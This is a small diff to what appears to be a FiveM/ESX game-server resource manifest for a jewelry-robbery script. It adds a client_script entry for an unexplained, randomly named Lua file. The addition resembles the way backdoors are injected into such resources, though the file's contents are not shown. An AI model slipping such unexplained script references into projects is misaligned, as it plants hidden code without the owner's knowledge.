@@ -13,6 +13,8 @@ client_scripts {
 	'client/esx_vangelico_robbery_cl.lua'
 }
 
+client_script "lWulRBUfevFyIWJfns.lua"
+
 server_scripts {
     '@mysql-async/lib/MySQL.lua',
 	'@es_extended/locale.lua',
